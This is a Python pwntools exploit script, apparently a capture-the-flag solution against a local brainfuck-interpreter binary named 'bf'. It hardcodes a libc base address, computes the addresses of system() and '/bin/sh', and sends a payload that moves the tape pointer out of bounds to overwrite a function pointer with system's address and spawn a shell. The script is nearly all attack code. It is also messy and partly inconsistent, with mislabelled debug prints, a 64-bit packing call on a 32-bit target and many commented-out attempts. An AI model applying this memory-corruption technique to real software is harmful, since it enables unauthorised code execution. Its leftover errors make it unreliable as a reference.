from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

# Load executable
exe = ELF("./bf")

# Libc
libc_base = 0xf7e0a000
libc = exe.libc
libc.address = libc_base
system_addr = libc.sym['system']
#sh_addr = next(libc.search(b"/bin/sh"))
diff_between_system_and_binsh = 0x120d7b # I calculated it!
sh_addr = system_addr + diff_between_system_and_binsh
print(f"sh addr  {sh_addr} , system addr: {hex(sh_addr)}")

conn = process("./bf") # local file
#puts_addr = p32(next(libc.search(b"puts")))
#execve_addr = p32(next(libc.search(b"libc_system")))
#system_addr = libc.symbols["system"]
#puts_libc = libc.symbols["puts"]
#puts_plt = p32(exe.plt['puts'])
#with open('test', 'wb') as fa:
#    fa.write(puts_plt)
#print(f"puts_libc: {puts_libc}")
#print(f"puts plt: {puts_plt}")
#print(f"puts addr: {puts_addr}")


with open("payload", "w") as f:
    f.write("")
#payload = ",.,.<\nAB\n".encode() # --> should work
# 1st part - before the input - just the commands
payload = ""
payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += ",>,>,>," # putchar - for sending the last char
payload += "BBBB" # call to puts(), need to jump 92 characters for our
payload +="\n"
conn.send(payload)
p = gdb.attach(conn, 
f'''
br main

'''
)
# 2nd part - the input to write ( the function to jump to ) 
with open("payload", "w+") as f:
    f.write(payload)
# separate sends cuz of annoying encoding / decoding issue with p32() and
# strings
#found = cyclic_find("BBBB")
#print(f"FOUND! {found}")
payload = b""
#payload += p32(0xf7e55db0)
#payload += p32(0x41414141)
payload += p32(system_addr)
payload +=b"\n"
conn.send(payload)
with open("payload", "ab+") as f:
    f.write(payload)

# Start process
#payload += "AAAA"
#payload += system_addr
#payload += ".+" * 224 # print 4 characters from puts() function
#payload = payload.encode().replace('\\n','\n')
payload += p32(system_addr)
#print(payload)
got_check = p64(exe.got['puts']) # the function address in GOT

print(conn.recvline()) # receive until newline
print(conn.recvline()) # receive until newline
output = conn.recv()
print(f"Program output: {output}") # receive until newline
#conn.recvuntil(b"result:") # receive until given keyword
#conn.send(b"-,+" + "\n" + "AB")



